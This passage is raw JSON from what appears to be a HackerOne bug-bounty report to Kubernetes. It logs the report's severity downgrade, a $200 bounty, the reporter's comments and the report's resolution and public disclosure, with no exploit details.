JsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3099f9f838e45d8cf811accdfd2725eaf9b6f813b6b70d2b065e7ade67fa2ec9"}],"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8265449,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-06-11T15:46:25.553Z","updated_at":"2020-06-11T15:46:25.553Z","additional_data":{"old_severity":"Medium (5.5)","new_severity":"Low","old_severity_id":738808,"new_severity_id":747227},"actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8265496,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the follow-up!\n\nThis finding is valid. I have changed the severity to Low due to the high privileges required to perform the attack. Typically, a user with rights to create a CRD is  in a cluster-admin or similar elevated role.\n\nWe would like to fix this issue in public. If you would like to be involved, please open a public issue at https://github.com/kubernetes/kubernetes/issues \n\nOtherwise, we're happy to open the public issue using the details you have provided.","automated_response":false,"created_at":"2020-06-11T15:53:26.856Z","updated_at":"2020-06-11T15:53:26.856Z","actor":{"url":"/kubernetes","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Kubernetes"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"kubernetes","collaborator":{"username":"lazydog","url":"/lazydog"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8265927,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, @kubernetes\n\nThanks for the bounty and quick respond,  i am very happy to invite me open an issue, but I'm sorry that i'm not be good at in english, that will cause the issue to look messy,  could you refer my writeup open an issue? it will be great if possible.\n\nIn addition, let me know this case can request a CVE IDs? if the answer is yes i will provide reporter name.\n\nBest regards,\n@lazydog","automated_response":false,"created_at":"2020-06-11T16:49:14.469Z","updated_at":"2020-06-11T16:49:14.469Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8420266,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-26T15:28:35.883Z","updated_at":"2020-06-26T15:28:35.883Z","actor":{"username":"celt","cleared":false,"url":"/celt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8732177,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Sorry for the long delay. I have finally opened a public GitHub issue: https://github.com/kubernetes/kubernetes/issues/93400\nThanks @lazydog for your submission.","automated_response":false,"created_at":"2020-07-23T23:13:47.613Z","updated_at":"2020-07-23T23:13:47.613Z","actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"lazydog","url":"/lazydog"},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8732180,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-23T23:14:24.808Z","updated_at":"2020-07-23T23:14:24.808Z","first_to_agree":true,"actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8733646,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-24T03:46:15.553Z","updated_at":"2020-07-24T03:46:15.553Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8733647,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-07-24T03:46:15.620Z","updated_at":"2020-07-24T03:46:15.620Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}